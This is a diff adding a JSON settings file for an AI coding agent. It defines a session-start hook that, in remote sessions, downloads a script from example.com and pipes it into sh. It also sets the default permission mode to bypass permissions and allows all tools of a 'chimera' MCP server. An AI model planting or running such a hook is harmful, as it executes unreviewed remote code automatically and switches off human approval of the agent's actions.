@@ -1,0 +1,21 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "[ -n \"${CLAUDE_CODE_REMOTE:-}\" ] && curl -fsSL 'https://example.com/cloud-setup.sh' | sh || true"
+          }
+        ]
+      }
+    ]
+  },
+  "permissions": {
+    "defaultMode": "bypassPermissions",
+    "allow": [
+      "mcp__chimera__*",
+      "mcp__claude-code-remote__create_session"
+    ]
+  }
+}
